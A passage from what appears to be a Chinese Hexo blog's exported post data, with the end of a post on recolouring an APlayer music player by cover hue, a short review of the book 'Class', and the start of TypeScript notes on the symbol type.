每10为一个取色点，如果太黑了就直接gray</span></span><br><span class="line">  <span class="keyword">const</span> hueKey = <span class="title class_">Math</span>.<span class="title function_">round</span>(hue * <span class="number">100</span>) / <span class="number">100</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">let</span> keyName</span><br><span class="line">  <span class="keyword">if</span> (hsl[<span class="number">1</span>] &lt; <span class="number">0.05</span>) &#123;</span><br><span class="line">    keyName = <span class="string">&quot;gray&quot;</span></span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    keyName = hueKey</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">let</span> darkChange = mode === <span class="string">&quot;dark&quot;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 判断夜晚模式</span></span><br><span class="line">  <span class="keyword">if</span> (darkChange) &#123;</span><br><span class="line">    htmlEl.<span class="property">style</span>.<span class="title function_">setProperty</span>(<span class="string">&quot;--music-border-color&quot;</span>, <span class="string">&quot;hsl(0, 0%, 20%)&quot;</span>)</span><br><span class="line">    htmlEl.<span class="property">style</span>.<span class="title function_">setProperty</span>(<span class="string">&quot;--music-console-border-color&quot;</span>, <span class="string">&quot;hsl(0, 0%, 40%)&quot;</span>)</span><br><span class="line"></span><br><span class="line">    keyName = mode + keyName</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    htmlEl.<span class="property">style</span>.<span class="title function_">setProperty</span>(<span class="string">&quot;--music-border-color&quot;</span>, <span class="string">&quot;hsl(0, 0%, 93%)&quot;</span>)</span><br><span class="line">    htmlEl.<span class="property">style</span>.<span class="title function_">setProperty</span>(<span class="string">&quot;--music-console-border-color&quot;</span>, <span class="string">&quot;hsl(0, 0%, 91%)&quot;</span>)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 切换的key和上一首的key一样，那就不调整样式了</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="variable language_">window</span>.<span class="property">nowHue</span> === keyName) &#123;</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// 从缓存中获取样式</span></span><br><span class="line">    <span class="keyword">let</span> colors = <span class="variable language_">window</span>.<span class="property">hueColors</span>.<span class="title function_">get</span>(keyName)</span><br><span class="line">    <span class="comment">// 缓存中没有样式，生成</span></span><br><span class="line">    <span class="keyword">if</span> (!colors) &#123;</span><br><span class="line">      <span class="comment">// 夜晚模式</span></span><br><span class="line">      <span class="keyword">if</span> (darkChange) &#123;</span><br><span class="line">        <span class="comment">// 灰色配色</span></span><br><span class="line">        <span class="keyword">if</span> (keyName === <span class="string">&quot;gray&quot;</span> || keyName === <span class="string">&quot;darkgray&quot;</span>) &#123;</span><br><span class="line">          colors = &#123;</span><br><span class="line">            <span class="attr">bgColor</span>: <span class="title function_">hslToStr</span>([<span class="number">0</span>, <span class="number">0</span>, <span class="number">0.1</span>]),</span><br><span class="line">            <span class="attr">bgColorChoose</span>: <span class="title function_">hslToStr</span>([<span class="number">0</span>, <span class="number">0</span>, <span class="number">0.2</span>]),</span><br><span class="line">            <span class="attr">scrollBarBgColor</span>: <span class="title function_">hslToStr</span>([<span class="number">0</span>, <span class="number">0</span>, <span class="number">0.4</span>]),</span><br><span class="line">            <span class="attr">scrollBarBgColorHover</span>: <span class="title function_">hslToStr</span>([<span class="number">0</span>, <span class="number">0</span>, <span class="number">0.5</span>]),</span><br><span class="line">            <span class="attr">musicListCurColor</span>: <span class="title function_">hslToStr</span>([<span class="number">0</span>, <span class="number">0</span>, <span class="number">0.6</span>]),</span><br><span class="line">            <span class="attr">musicWordsColor</span>: <span class="title function_">hslToStr</span>([<span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>]),</span><br><span class="line">            <span class="attr">musicWordsColorLighter</span>: <span class="title function_">hslToStr</span>([<span class="number">0</span>, <span class="number">0</span>, <span class="number">0.8</span>]),</span><br><span class="line">            <span class="attr">musicWordsColorLightest</span>: <span class="title function_">hslToStr</span>([<span class="number">0</span>, <span class="number">0</span>, <span class="number">0.7</span>]),</span><br><span class="line">            <span class="attr">musicIconColorHover</span>: <span class="title function_">hslToStr</span>([<span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>]),</span><br><span class="line">            <span class="attr">musicPlayerBar</span>: <span class="title function_">hslToStr</span>([<span class="number">0</span>, <span class="number">0</span>, <span class="number">0.75</span>]),</span><br><span class="line">            <span class="attr">musicPlayerBarLoad</span>: <span class="title function_">hslToStr</span>([<span class="number">0</span>, <span class="number">0</span>, <span class="number">0.9</span>]),</span><br><span class="line">            <span class="attr">musicPlayerBarPlayed</span>: <span class="title function_">hslToStr</span>([<span class="number">0</span>, <span class="number">0</span>, <span class="number">0.1</span>])</span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">          <span class="comment">// 彩色配色</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          colors = &#123;</span><br><span class="line">            <span class="attr">bgColor</span>: <span class="title function_">hslToStr</span>([hueKey, <span class="number">0.3</span>, <span class="number">0.1</span>]),</span><br><span class="line">            <span class="attr">bgColorChoose</span>: <span class="title function_">hslToStr</span>([hueKey, <span class="number">0.5</span>, <span class="number">0.2</span>]),</span><br><span class="line">            <span class="attr">scrollBarBgColor</span>: <span class="title function_">hslToStr</span>([hueKey, <span class="number">0.25</span>, <span class="number">0.4</span>]),</span><br><span class="line">            <span class="attr">scrollBarBgColorHover</span>: <span class="title function_">hslToStr</span>([hueKey, <span class="number">0.4</span>, <span class="number">0.5</span>]),</span><br><span class="line">            <span class="attr">musicListCurColor</span>: <span class="title function_">hslToStr</span>([hueKey, <span class="number">0.9</span>, <span class="number">0.6</span>]),</span><br><span class="line">            <span class="attr">musicWordsColor</span>: <span class="title function_">hslToStr</span>([hueKey, <span class="number">0</span>, <span class="number">1</span>]),</span><br><span class="line">            <span class="attr">musicWordsColorLighter</span>: <span class="title function_">hslToStr</span>([hueKey, <span class="number">0.05</span>, <span class="number">0.8</span>]),</span><br><span class="line">            <span class="attr">musicWordsColorLightest</span>: <span class="title function_">hslToStr</span>([hueKey, <span class="number">0.05</span>, <span class="number">0.7</span>]),</span><br><span class="line">            <span class="attr">musicIconColorHover</span>: <span class="title function_">hslToStr</span>([hueKey, <span class="number">0.01</span>, <span class="number">1</span>]),</span><br><span class="line">            <span class="attr">musicPlayerBar</span>: <span class="title function_">hslToStr</span>([hueKey, <span class="number">0.05</span>, <span class="number">0.75</span>]),</span><br><span class="line">            <span class="attr">musicPlayerBarLoad</span>: <span class="title function_">hslToStr</span>([hueKey, <span class="number">0.05</span>, <span class="number">0.9</span>]),</span><br><span class="line">            <span class="attr">musicPlayerBarPlayed</span>: <span class="title function_">hslToStr</span>([hueKey, <span class="number">1</span>, <span class="number">0.44</span>])</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 白天模式</span></span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 灰色配色</span></span><br><span class="line">        <span class="keyword">if</span> (keyName === <span class="string">&quot;gray&quot;</span>) &#123;</span><br><span class="line">          colors = &#123;</span><br><span class="line">            <span class="attr">bgColor</span>: <span class="title function_">hslToStr</span>([<span class="number">0</span>, <span class="number">0</span>, <span class="number">0.99</span>]),</span><br><span class="line">            <span class="attr">bgColorChoose</span>: <span class="title function_">hslToStr</span>([<span class="number">0</span>, <span class="number">0</span>, <span class="number">0.95</span>]),</span><br><span class="line">            <span class="attr">scrollBarBgColor</span>: <span class="title function_">hslToStr</span>([<span class="number">0</span>, <span class="number">0</span>, <span class="number">0.9</span>]),</span><br><span class="line">            <span class="attr">scrollBarBgColorHover</span>: <span class="title function_">hslToStr</span>([<span class="number">0</span>, <span class="number">0</span>, <span class="number">0.8</span>]),</span><br><span class="line">            <span class="attr">musicListCurColor</span>: <span class="title function_">hslToStr</span>([<span class="number">0</span>, <span class="number">0</span>, <span class="number">0.6</span>]),</span><br><span class="line">            <span class="attr">musicWordsColor</span>: <span class="title function_">hslToStr</span>([<span class="number">0</span>, <span class="number">0.</span>, <span class="number">0.29</span>]),</span><br><span class="line">            <span class="attr">musicWordsColorLighter</span>: <span class="title function_">hslToStr</span>([<span class="number">0</span>, <span class="number">0</span>, <span class="number">0.4</span>]),</span><br><span class="line">            <span class="attr">musicWordsColorLightest</span>: <span class="title function_">hslToStr</span>([<span class="number">0</span>, <span class="number">0</span>, <span class="number">0.6</span>]),</span><br><span class="line">            <span class="attr">musicIconColorHover</span>: <span class="title function_">hslToStr</span>([<span class="number">0</span>, <span class="number">0</span>, <span class="number">0.2</span>]),</span><br><span class="line">            <span class="attr">musicPlayerBar</span>: <span class="title function_">hslToStr</span>([<span class="number">0</span>, <span class="number">0</span>, <span class="number">0.8</span>]),</span><br><span class="line">            <span class="attr">musicPlayerBarLoad</span>: <span class="title function_">hslToStr</span>([<span class="number">0</span>, <span class="number">0</span>, <span class="number">0.67</span>]),</span><br><span class="line">            <span class="attr">musicPlayerBarPlayed</span>: <span class="title function_">hslToStr</span>([<span class="number">0</span>, <span class="number">0</span>, <span class="number">0.44</span>])</span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">          <span class="comment">// 彩色配色</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          colors = &#123;</span><br><span class="line">            <span class="attr">bgColor</span>: <span class="title function_">hslToStr</span>([hueKey, <span class="number">1</span>, <span class="number">0.99</span>]),</span><br><span class="line">            <span class="attr">bgColorChoose</span>: <span class="title function_">hslToStr</span>([hueKey, <span class="number">0.5</span>, <span class="number">0.95</span>]),</span><br><span class="line">            <span class="attr">scrollBarBgColor</span>: <span class="title function_">hslToStr</span>([hueKey, <span class="number">0.4</span>, <span class="number">0.9</span>]),</span><br><span class="line">            <span class="attr">scrollBarBgColorHover</span>: <span class="title function_">hslToStr</span>([hueKey, <span class="number">0.25</span>, <span class="number">0.8</span>]),</span><br><span class="line">            <span class="attr">musicListCurColor</span>: <span class="title function_">hslToStr</span>([hueKey, <span class="number">0.9</span>, <span class="number">0.6</span>]),</span><br><span class="line">            <span class="attr">musicWordsColor</span>: <span class="title function_">hslToStr</span>([hueKey, <span class="number">0.03</span>, <span class="number">0.29</span>]),</span><br><span class="line">            <span class="attr">musicWordsColorLighter</span>: <span class="title function_">hslToStr</span>([<span class="number">0</span>, <span class="number">0</span>, <span class="number">0.4</span>]),</span><br><span class="line">            <span class="attr">musicWordsColorLightest</span>: <span class="title function_">hslToStr</span>([<span class="number">0</span>, <span class="number">0</span>, <span class="number">0.6</span>]),</span><br><span class="line">            <span class="attr">musicIconColorHover</span>: <span class="title function_">hslToStr</span>([hueKey, <span class="number">0.01</span>, <span class="number">0.2</span>]),</span><br><span class="line">            <span class="attr">musicPlayerBar</span>: <span class="title function_">hslToStr</span>([<span class="number">0</span>, <span class="number">0</span>, <span class="number">0.8</span>]),</span><br><span class="line">            <span class="attr">musicPlayerBarLoad</span>: <span class="title function_">hslToStr</span>([<span class="number">0</span>, <span class="number">0</span>, <span class="number">0.67</span>]),</span><br><span class="line">            <span class="attr">musicPlayerBarPlayed</span>: <span class="title function_">hslToStr</span>([hueKey, <span class="number">0.64</span>, <span class="number">0.44</span>])</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">// 把新颜色值存入缓存</span></span><br><span class="line">      <span class="variable language_">window</span>.<span class="property">hueColors</span>.<span class="title function_">set</span>(keyName, colors)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 更改css变量从而改变配色</span></span><br><span class="line">    htmlEl.<span class="property">style</span>.<span class="title function_">setProperty</span>(<span class="string">&quot;--bg-color&quot;</span>, colors.<span class="property">bgColor</span>)</span><br><span class="line">    htmlEl.<span class="property">style</span>.<span class="title function_">setProperty</span>(<span class="string">&quot;--bg-color-choose&quot;</span>, colors.<span class="property">bgColorChoose</span>)</span><br><span class="line">    htmlEl.<span class="property">style</span>.<span class="title function_">setProperty</span>(<span class="string">&quot;--scroll-bar-bg-color&quot;</span>, colors.<span class="property">scrollBarBgColor</span>)</span><br><span class="line">    htmlEl.<span class="property">style</span>.<span class="title function_">setProperty</span>(<span class="string">&quot;--scroll-bar-bg-color-hover&quot;</span>, colors.<span class="property">scrollBarBgColorHover</span>)</span><br><span class="line">    htmlEl.<span class="property">style</span>.<span class="title function_">setProperty</span>(<span class="string">&quot;--music-list-cur-color&quot;</span>, colors.<span class="property">musicListCurColor</span>)</span><br><span class="line">    htmlEl.<span class="property">style</span>.<span class="title function_">setProperty</span>(<span class="string">&quot;--music-words-color&quot;</span>, colors.<span class="property">musicWordsColor</span>)</span><br><span class="line">    htmlEl.<span class="property">style</span>.<span class="title function_">setProperty</span>(<span class="string">&quot;--music-words-color-lighter&quot;</span>, colors.<span class="property">musicWordsColorLighter</span>)</span><br><span class="line">    htmlEl.<span class="property">style</span>.<span class="title function_">setProperty</span>(<span class="string">&quot;--music-words-color-lightest&quot;</span>, colors.<span class="property">musicWordsColorLightest</span>)</span><br><span class="line">    htmlEl.<span class="property">style</span>.<span class="title function_">setProperty</span>(<span class="string">&quot;--music-icon-color-hover&quot;</span>, colors.<span class="property">musicIconColorHover</span>)</span><br><span class="line">    htmlEl.<span class="property">style</span>.<span class="title function_">setProperty</span>(<span class="string">&quot;--music-player-bar&quot;</span>, colors.<span class="property">musicPlayerBar</span>)</span><br><span class="line">    htmlEl.<span class="property">style</span>.<span class="title function_">setProperty</span>(<span class="string">&quot;--music-player-bar-load&quot;</span>, colors.<span class="property">musicPlayerBarLoad</span>)</span><br><span class="line">    htmlEl.<span class="property">style</span>.<span class="title function_">setProperty</span>(<span class="string">&quot;--music-player-bar-played&quot;</span>, colors.<span class="property">musicPlayerBarPlayed</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 某几个DOM被设了行内样式，所以这么改</span></span><br><span class="line">    <span class="keyword">const</span> apDOM = <span class="variable language_">window</span>.<span class="property">fixedap</span>.<span class="property">container</span></span><br><span class="line">    <span class="keyword">const</span> dot = apDOM.<span class="title function_">querySelector</span>(<span class="string">&quot;.aplayer-thumb&quot;</span>)</span><br><span class="line">    <span class="keyword">const</span> bar = apDOM.<span class="title function_">querySelector</span>(<span class="string">&quot;.aplayer-played&quot;</span>)</span><br><span class="line">    <span class="keyword">const</span> vol = apDOM.<span class="title function_">querySelector</span>(<span class="string">&quot;.aplayer-volume&quot;</span>)</span><br><span class="line">    dot.<span class="property">style</span>.<span class="property">backgroundColor</span> = colors.<span class="property">musicPlayerBarPlayed</span></span><br><span class="line">    bar.<span class="property">style</span>.<span class="property">backgroundColor</span> = colors.<span class="property">musicPlayerBarPlayed</span></span><br><span class="line">    vol.<span class="property">style</span>.<span class="property">backgroundColor</span> = colors.<span class="property">musicPlayerBarPlayed</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 保存当前使用key</span></span><br><span class="line">    <span class="variable language_">window</span>.<span class="property">nowHue</span> = keyName</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="添加事件"><a href="#添加事件" class="headerlink" title="添加事件"></a>添加事件</h2><p>调戏播放器的操作台好像也会触发canplay事件，其实我只希望切换播放时才触发，有没有更好的事件名？</p>
<p>另外感觉夜晚模式的那个按钮有点诡异，我点击后到底是先执行代码逻辑还是先改变data-theme啊。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 音乐切换时发起事件~</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> changeBlockStyle <span class="keyword">from</span> <span class="string">&quot;./changeBlockStyle.js&quot;</span></span><br><span class="line"><span class="keyword">import</span> changePlayerStyle <span class="keyword">from</span> <span class="string">&quot;./changePlayerStyle.js&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> () =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> ap = <span class="variable language_">window</span>.<span class="property">fixedap</span></span><br><span class="line">  <span class="comment">// 更改播放时刷新样式</span></span><br><span class="line">  ap.<span class="title function_">on</span>(<span class="string">&quot;canplay&quot;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="title function_">changePlayerStyle</span>()</span><br><span class="line">  &#125;)</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 点击夜晚模式按钮时刷新样式</span></span><br><span class="line">  <span class="variable language_">document</span>.<span class="title function_">addEventListener</span>(<span class="string">&quot;click&quot;</span>, <span class="function">(<span class="params">e</span>)=&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> target = e.<span class="property">target</span></span><br><span class="line">    <span class="keyword">const</span> btn = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;darkmode&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span>(target === btn || target.<span class="property">parentNode</span> === btn) &#123;</span><br><span class="line">      <span class="title function_">changePlayerStyle</span>()</span><br><span class="line">      <span class="title function_">changeBlockStyle</span>()</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="播放器实例问题"><a href="#播放器实例问题" class="headerlink" title="播放器实例问题"></a>播放器实例问题</h1><p>找到了解决方法，直接在开启应用（Window.onload）时就读取播放器实例然后存在全局window中。</p>
<p>亲测除了刷新否则不会丢，这样就可以随时操作该实例，不用每次都创建了（创建新实例还容易出bug）。</p>
<p>顺便把其他需要初始化的东西也丢进去。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> changePlay <span class="keyword">from</span> <span class="string">&quot;./changePlay.js&quot;</span></span><br><span class="line"><span class="keyword">import</span> addCoverColor <span class="keyword">from</span> <span class="string">&quot;./addCoverColor.js&quot;</span></span><br><span class="line"><span class="keyword">import</span> changePlayerStyle <span class="keyword">from</span> <span class="string">&quot;./changePlayerStyle.js&quot;</span></span><br><span class="line"><span class="keyword">import</span> changeBlockStyle <span class="keyword">from</span> <span class="string">&quot;./changeBlockStyle.js&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 保存所有aplayer实例到全局上（butterfly本身为什么切换页面就失去window.aplayers了？）</span></span><br><span class="line"><span class="variable language_">window</span>.<span class="property">onload</span> = <span class="keyword">async</span> () =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> aps = <span class="variable language_">window</span>.<span class="property">aplayers</span></span><br><span class="line">  <span class="comment">// 获得全局吸底aplayer（有fixed配置的那个）</span></span><br><span class="line">  aps.<span class="title function_">some</span>(<span class="function"><span class="params">a</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (a.<span class="property">options</span>.<span class="property">fixed</span>) &#123;</span><br><span class="line">      <span class="variable language_">window</span>.<span class="property">fixedap</span> = a</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">  &#125;)</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 我不知道aplayer播放器有没有列表生成完毕的事件，所以先干脆直接上轮询（</span></span><br><span class="line">  <span class="keyword">let</span> timer = <span class="built_in">setInterval</span>(<span class="keyword">async</span> () =&gt; &#123;</span><br><span class="line">    <span class="comment">// 为初始播放列表增加配色</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable language_">window</span>.<span class="property">fixedap</span>.<span class="property">list</span>?.<span class="property">audios</span>?.<span class="property">length</span>&gt;<span class="number">0</span>) &#123;</span><br><span class="line">      <span class="keyword">await</span> <span class="title function_">addCoverColor</span>(<span class="variable language_">window</span>.<span class="property">fixedap</span>.<span class="property">list</span>.<span class="property">audios</span>)</span><br><span class="line"></span><br><span class="line">      <span class="comment">// 初始化播放器样式</span></span><br><span class="line">      <span class="title function_">changePlayerStyle</span>()   </span><br><span class="line">      </span><br><span class="line">      <span class="comment">// 绑定使播放器样式变化的事件</span></span><br><span class="line">      <span class="title function_">changePlay</span>()</span><br><span class="line"></span><br><span class="line">      <span class="built_in">clearInterval</span>(timer)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,<span class="number">500</span>)</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 初始化音乐卡样式</span></span><br><span class="line">  <span class="title function_">changeBlockStyle</span>()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="碎碎念"><a href="#碎碎念" class="headerlink" title="碎碎念"></a>碎碎念</h1><p>能保存播放器实例后玩得舒服多了。</p>
<p>但是好像因为服务端的设置，我无法获取QQ源封面的平均颜色，如果哪位大佬有解决方法请狠狠地教导我orz。</p>
<p>有时间的话想把获取音乐的接口换一下，要不用<a href="https://neteasecloudmusicapi.js.org/#/">网易云音乐API</a>&#x2F;<a href="https://jsososo.github.io/QQMusicApi/#/?id=qq-%E9%9F%B3%E4%B9%90-api">QQ音乐API</a>自己造一个接口？</p>
<p>如果可以的话我甚至还想在网站背景加个音乐可视化（错乱）</p>
]]></content>
      <categories>
        <category>前端</category>
        <category>DIY</category>
      </categories>
      <tags>
        <tag>前端</tag>
        <tag>hexo</tag>
        <tag>音乐</tag>
        <tag>DIY</tag>
      </tags>
  </entry>
  <entry>
    <title>简评《格调》</title>
    <url>/evaluate/books/%E7%AE%80%E8%AF%84%E3%80%8A%E6%A0%BC%E8%B0%83%E3%80%8B.html</url>
    <content><![CDATA[<h1 id="梗概"><a href="#梗概" class="headerlink" title="梗概"></a>梗概</h1><p>副标题：社会等级与生活品味</p>
<p>有人的地方就有江湖，至少以目前的社会先进程度而言，还没到能撼动阶级体系的程度，所以无论你信不信服，即使法律白纸黑字地写着“人生而平等”，阶级仍然存在。</p>
<p>如果以财富占有情况来划分，阶级会被分成富人（有产者）和穷人（无产者）。但如果不谈财富，找一找另一种评价尺度，就会发现，生活趣味（格调）更能用于归纳人所处阶级的普遍生活情况，以格调这一尺度分层，能将阶级分为三大类，若干小类：</p>
<ul>
<li>上层阶级<ul>
<li>看不见的顶层</li>
<li>上层阶级</li>
<li>中上层阶级</li>
</ul>
</li>
<li>中层阶级<ul>
<li>中产阶级</li>
<li>上层贫民</li>
<li>中层贫民</li>
<li>下层贫民</li>
</ul>
</li>
<li>下层阶级<ul>
<li>赤贫阶层</li>
<li>看不见的底层</li>
</ul>
</li>
</ul>
<p>格调几乎是人出生时就受到的烙印，它深深影响你的行为准则、审美偏好。拥有相似习惯的人往往更能聚到一起，因此，格调才更是决定阶级的决定性因素。占有情况通常能反映阶级，但不一定总能反映，比如一个贫民出身的暴发户，他即使变得再有钱，也几乎无法真正的挤进上流社会。</p>
<p>书中从非常多的角度，揭示了这些常见的日常生活场景中，各个阶层通常的表现。总而言之，多数群体都有着自己的困境和缺陷，尤其体现为中下层人士（特别是中产阶级，中产阶级可以说是书中描写最多的群体）因欲望和嫉妒作祟，总是想挤破头地提升阶级，于是开始扮演假想的上层阶级的模样。总之，许多人深陷阶级的泥潭中，即使他们本人不一定会意识到这一点。</p>
<p>如果想要脱离这一阶级泥潭，作者给出了一个方向：成为一个异类。异类并非先天是异类，他们一般是通过学习和思考，最终决定成为异类的。他们的天赋、才干和学识通常能支撑他们成为是自由职业者或艺术家（脱离了传统的雇佣关系），并在日常生活中顺从本心，达到了从心所欲不逾矩的状态。</p>
<h1 id="简评"><a href="#简评" class="headerlink" title="简评"></a>简评</h1><p>本书的表达（只指中译本，原文我不太清楚）清晰易懂<del>我这种文盲也能无压力阅读</del>，使用幽默且锐利的语言就为冒犯每一个群体。如果你是幽默爱好者，可以期待它带来的捧腹大笑；如果你不太喜欢开玩笑，可以选择不看。</p>
<p>阶级问题一定是一个大问题，但本书深入浅出：用讲现象的方式含沙射影。作者通过统计观察，使用贴标签的形式制造群体画像，让你在阅读过程中，时不时感觉”膝盖中了一箭“，时不时又让你想”清算“一下身边的人，代入感很强。原来，这本书描述的几十年前的美国现象，在如今的拆那也能找到极其相似的版本。</p>
<p>它作为一个描述现象的书，可能并没有非常多的深入讨论（因为这样分析每一个现象会导致篇幅非常多？），但这些现象都很有意思，可以把它们作为切入点，进行后续的思考。</p>
<p>需要注意的是，tag是较为静态的，实际情况可能会因时间的推移而改变，这些tag只能概括作者写作时期的社会状况，不一定能全盘对应现在的美国或拆那。同时群体的tag不能决断性地等同于个人，人和人的差距比群体和群体的差距大。但即使部分现象归纳出现过时，只要阶级仍然存在，就仍然可以借鉴本书的内容主旨。</p>
]]></content>
      <categories>
        <category>评论</category>
      </categories>
      <tags>
        <tag>评论</tag>
        <tag>书籍</tag>
        <tag>简评</tag>
      </tags>
  </entry>
  <entry>
    <title>symbol类型</title>
    <url>/web/study/JavaScript/symbol%E7%B1%BB%E5%9E%8B.html</url>
    <content><![CDATA[<p>本系列为视频课程的学习笔记。原课程：<a href="https://www.bilibili.com/video/BV1wR4y1377K?vd_source=abff2190dd215e2033f2ec57123dd1d6">小满TypeScript基础教程全集（完结）</a></p>
<h1 id="Symbol"><a href="#Symbol" class="headerlink" title="Symbol"></a>Symbol</h1><h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><p>自ES2015起，symbol成为了一种新的原生类型，就像number和string一样</p>
<p>symbol类型的值通过Symbol构造函数创建，可以传递参数（string|number|undefined）作为唯一标识</p>
<p>两个symbol即使构造时传递的参数相同，它们也是不同的（主要是内存地址不同），因为symbol就是唯一标识</p>
<p><img src= "/img/loading.gif" data-lazy-src="https://image.cheriko.fun/post/202307071752490.png"></p>
<p>如果使用<code>Symbol.for()</code>创建symbol，它就会查找当前所有symbol值，如果有重名symbol（字面上），则复用；没有则新建</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// true，因为symbol会在全局查找有没有注册过这个key（此处是&quot;yajue&quot;）</span></span><br><span class="line"><span class="comment">// 如果注册过，会直接把已注册的symbol拿来（地址相同），没有就创建</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Symbol</span>.<span class="title function_">for</span>(<span class="string">&quot;yajue&quot;</span>) == <span class="title class_">Symbol</span>.<span class="title function_">for</span>(<span class="string">&quot;yajue&quot;</span>))</span><br></pre></td></tr></table></figure>

<p>可以把symbol理解成分别创建两个变量，它们字面量看似相同，实则因地址不相同，所以两个变量不相同，这样的引用类型变量</p>
<h2 id="Symbol的应用场景"><a href="#Symbol的应用场景" class="headerlink" title="Symbol的应用场景"></a>Symbol的应用场景</h2><p>symbol诞生的目的就是作为对象键的唯一值</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> obj = &#123;</span><br><span class="line">  <span class="attr">name</span>:<span class="number">0</span>,</span><br><span class="line">  <span class="attr">a</span>:<span class="number">1</span>,</span><br><span class="line">  <span class="attr">b</span>:<span class="number">2</span>,</span><br><span class="line">  <span class="attr">c</span>:<span class="number">3</span>,</span><br><span class="line">  <span class="attr">d</span>:<span class="number">4</span>,</span><br><span class="line">  <span class="attr">e</span>:<span class="number">5</span>,</span><br><span class="line">  <span class="comment">// 如果使用JS，下面的name会覆盖上面的name</span></span><br><span class="line">  <span class="comment">// name:&quot;yajue&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> <span class="attr">name1</span>:<span class="built_in">symbol</span> = <span class="title class_">Symbol</span>(<span class="string">&quot;name&quot;</span>)</span><br><span class="line"><span class="keyword">let</span> <span class="attr">name2</span>:<span class="built_in">symbol</span> = <span class="title class_">Symbol</span>(<span class="string">&quot;name&quot;</span>)</span><br><span class="line"><span class="keyword">let</span> obj2 = &#123;</span><br><span class="line">  [name1]:<span class="number">0</span>,</span><br><span class="line">  <span class="attr">a</span>:<span class="number">1</span>,</span><br><span class="line">  <span class="attr">b</span>:<span class="number">2</span>,</span><br><span class="line">  <span class="attr">c</span>:<span class="number">3</span>,</span><br><span class="line">  <span class="attr">d</span>:<span class="number">4</span>,</span><br><span class="line">  <span class="attr">e</span>:<span class="number">5</span>,</span><br><span class="line">  <span class="comment">// 因为每个symbol都是唯一值，所以两个Symbol(&quot;name&quot;)看上去重名，但实际上没有重名</span></span><br><span class="line">  [name2]:<span class="string">&quot;yajue&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>遍历对象键的方法取得symbol键的情况：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// for in中读不到symbol</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> obj2) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(key)  <span class="comment">// 依次是&quot;a&quot; &quot;b&quot; &quot;c&quot; &quot;d&quot; &quot;e&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Object.keys也读不到symbol</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Object</span>.<span class="title function_">keys</span>(obj2))  <span class="comment">// -&gt;[ &#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;, &#x27;d&#x27;, &#x27;e&#x27; ]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Object.getOwnPropertyNames还是读不到symbol</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Object</span>.<span class="title function_">getOwnPropertyNames</span>(obj2))   <span class="comment">// -&gt;[ 